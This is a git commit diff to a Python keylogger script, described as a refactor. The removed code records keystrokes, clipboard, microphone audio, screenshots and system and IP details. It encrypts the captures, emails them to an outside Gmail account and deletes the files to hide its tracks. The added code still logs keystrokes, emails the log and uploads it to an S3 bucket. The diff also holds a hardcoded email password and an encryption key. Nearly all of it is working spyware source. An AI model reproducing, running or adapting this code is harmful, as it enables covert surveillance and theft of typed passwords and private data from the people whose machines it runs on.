ac11c67759dbdb22b05ef94507dd9011f6499ed9
Divyansh-Raj <divyanshgupta1406@gmail.com>
2025-03-20 23:37:45 +0530

    Refactor the whole code and removed the irrelevant code

--- project/Keylog.py
+++ project/Keylog.py
@@ -1,253 +1,94 @@
-# Libraries
+# Import necessary libraries
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
 import smtplib
-
-# Default modules or libraries for collecting computer information
-import socket
-import platform
-
-# to get the clipboard
-import win32clipboard
-
-# Library to grab keystroke
-from pynput.keyboard import Key, Listener
-
-import time
 import os
+import time
+from pynput.keyboard import Key, Listener
+import boto3
 
-#Libraries to import microphone capabilities
-from scipy.io.wavfile import write
-import sounddevice as sd
 
-#Library to encrypt our file
-from cryptography.fernet import Fernet
-
-#Libraries
-import getpass
-from requests import get
-
-from multiprocessing import Process, freeze_support
-from PIL import ImageGrab
-
-#key log file- all the keys logged will be stored
-keys_information = "key_log.txt"
-system_information = "systeminfo.txt"
-clipboard_information = "clipboard.txt"
-audio_information = "audio.wav"
-screenshot_information = "screenshot.png"
-
-keys_information_e = "e_key_log.txt"
-system_information_e = "e_systeminfo.txt"
-clipboard_information_e = "e_clipboard.txt"
-
-microphone_time = 10
-time_iteration = 15
-number_of_iterations_end = 3
-
-username = getpass.getuser()
-
+# Email Configuration
 email_address = "keyloggerproject10@gmail.com"
 password = "Project@123"
+toaddr = "divyanshgupta1406@gmail.com"
 
-toaddr= "keyloggerproject10@gmail.com"
+# File Paths
+file_path = "C:\\Python_For_Divyansh\\API-keylogger\\project"
+keys_information = "key_log.txt"
+file_merge = os.path.join(file_path, keys_information)
 
-key = "-YUJJj8vx2mislfJmPu1K5-LxhmWRKFHAxY1Bmm5tSo="
-
-file_path = "C:\Users\dhana\PycharmProjects\API-keylogger\project"
-extend = "\\"
-file_merge = file_path + extend
-
-# email controls
+# Function to send email with logs
 def send_email(filename, attachment, toaddr):
-
     fromaddr = email_address
-
     msg = MIMEMultipart()
-
     msg['From'] = fromaddr
-
     msg['To'] = toaddr
+    msg['Subject'] = "KeyLogger Log File"
+    body = "Logged keystrokes are attached."
+    msg.attach(MIMEText(body, 'plain'))
 
-    msg['Subject'] = "Log File"
-
-    body = "Body_of_the_mail"
-
-    msg.attach(MIMEText(body, 'plan'))
-
-    filename = filename
-    attachment = open(attachment, 'rb')
-
-    p = MIMEBase('application', 'octet-stream')
-
-    p.set_payload((attachment).read())
+    with open(attachment, 'rb') as file:
+        p = MIMEBase('application', 'octet-stream')
+        p.set_payload(file.read())
 
     encoders.encode_base64(p)
-
-    p.add_header('Content-Disposition', "attachment: filename= %s" % filename)
-
+    p.add_header('Content-Disposition', f"attachment; filename={filename}")
     msg.attach(p)
 
-    s = smtplib.SMTP('smtp.gmail.com', 587)
+    # Send the email
+    server = smtplib.SMTP('smtp.gmail.com', 587)
+    server.starttls()
+    server.login(fromaddr, password)
+    server.sendmail(fromaddr, toaddr, msg.as_string())
+    server.quit()
 
-    s.starttls()
+# Function to write keystrokes to a file
+def write_file(keys):
+    with open(file_merge, "a") as f:
+        for key in keys:
+            k = str(key).replace("'", "")
+            if k.find("space") > 0:
+                f.write("\n")
+            elif k.find("Key") == -1:
+                f.write(k)
 
-    s.login(fromaddr, password)
+# Function to log keystrokes
+keys = []
+def on_press(key):
+    global keys
+    print(f"Key Pressed: {key}")  # Debugging (Remove later)
+    keys.append(key)
 
-    text = msg.as_string()
+    if len(keys) >= 10:  # Save after 10 keystrokes
+        write_file(keys)
+        keys = []
 
-    s.sendmail(fromaddr, toaddr, text)
+def on_release(key):
+    if key == Key.esc:  # Stop on Esc key
+        return False
 
-    s.quit()
+# Start keylogger
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
 
-send_email(keys_information, file_path + extend + keys_information, toaddr)
+# Send email with logs after execution
+send_email(keys_information, file_merge, toaddr)
 
-# get the computer information
-def computer_information():
-    with open(file_path + extend + system_information, "a") as f:
-        hostname = socket.gethostname()
-        IPAddr = socket.gethostbyname(hostname)
-        try:
-            public_ip = get("https://api.ipify.org").text
-            f.write("Public IP Address: " + public_ip)
+# AWS Credentials (Replace with your actual credentials)
+AWS_ACCESS_KEY = "YOUR_ACCESS_KEY"
+AWS_SECRET_KEY = "YOUR_SECRET_KEY"
+BUCKET_NAME = "my-keylogger-bucket"
 
-        except Exception:
-            f.write("couldn't get Public IP Address (most likely max query)")
+# AWS S3 Client
+s3 = boto3.client("s3", aws_access_key_id=AWS_ACCESS_KEY, aws_secret_access_key=AWS_SECRET_KEY)
 
-        f.write("Processor: " +(platform.processor()) + '\n' )
-        f.write("System: " + platform.system() + " " + platform.version() + '\n')
-        f.write("Machine: " + platform.machine() + "\n")
-        f.write("Hostname: " + hostname + "\n")
-        f.write("Private IP Address: " + IPAddr + "\n")
+def upload_to_s3(file_path, bucket_name):
+    file_name = os.path.basename(file_path)
+    s3.upload_file(file_path, bucket_name, file_name)
+    print(f"✅ Uploaded {file_name} to S3!")
 
-computer_information()
-
-# get the clipboard contents
-def copy_clipboard():
-    with open(file_path + extend + clipboard_information, "a") as f:
-        try:
-            win32clipboard.OpenClipboard()
-            pasted_data = win32clipboard.GetClipboardData()
-            win32clipboard.CloseClipboard()
-
-            f.write("Clipboard Data: \n" + pasted_data)
-
-        except:
-            f.write("Clipboard could be not copied")
-
-copy_clipboard()
-
-#get the microphone
-def microphone():
-    fs = 44100
-    seconds = microphone_time
-
-    myrecording = sd.rec(int(seconds ^ fs), samplerate=fs, channels=2)
-    sd.wait()
-
-    write(file_path + extend + audio_information, fs, myrecording)
-
-microphone()
-
-# get screenshots
-def screenshot():
-    im = ImageGrab.grab()
-    im.save(file_path + extend + screenshot_information)
-
-screenshot()
-
-number_of_iterations = 0
-currentTime = time.time()
-stoppingTime = time.time() + time_iteration
-
-# Timer for keylogger
-while number_of_iterations < number_of_iterations_end:
-
-    count = 0
-    keys = []
-
-    def on_press(key):
-       global keys, count, currentTime
-
-
-       print(key)
-       keys.append(key)  # append each key to the empty list
-       count +=1
-       currentTime = time.time()
-
-       if count>= 1:
-           count = 0
-           write_file(keys)
-           keys = []
-
-    # write file function which is going to write keys to a specific file that we are going to specify
-
-    def write_file(keys):
-       with open(file_path + extend + keys_information, "a") as f:
-           for key in keys:
-               k = str(key).replace("'", "")
-               if k.find("space") > 0:
-                   f.write('\n')
-                   f.close()
-               elif k.find("Key") == -1:
-                   f.write(k)
-                   f.close()
-
-
-    def on_release(key):
-      if key == Key.esc:
-          return False
-      if currentTime > stoppingTime:
-          return False
-
-
-    with Listener(on_press=on_press, on_release=on_release) as listener:
-       listener.join()
-
-
-    # Setting the email functionality within the keylogger
-
-
-    if currentTime > stoppingTime:
-
-        with open(file_path + extend + keys_information, "w") as f:
-            f.write(" ")
-
-        screenshot()
-        send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)
-
-        copy_clipboard()
-
-        number_of_iterations +=1
-
-        currentTime = time.time()
-        stoppingTime = time.time() + time_iteration
-
-# Encrypt files
-files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information]
-encrypted_file_names = [file_merge + system_information_e, file_merge + clipboard_information_e + file_merge+ keys_information_e]
-
-count=0
-
-for encrypting_file in files_to_encrypt:
-
-    with open(files_to_encrypt[count], 'rb') as f:
-        data = f.read()
-
-    fernet = Fernet(key)
-    encrypted = fernet.encrypt(data)
-
-    with open(encrypted_file_names[count], 'wb') as f:
-        f.write(encrypted)
-
-    send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)
-    count +=1
-
-time.sleep(120)
-
-# Clean up our tracks and delete files
-delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
-for files in delete_files:
-    os.remove(file_merge + files)
+# Call this function after logging keystrokes
+upload_to_s3(file_merge, BUCKET_NAME)
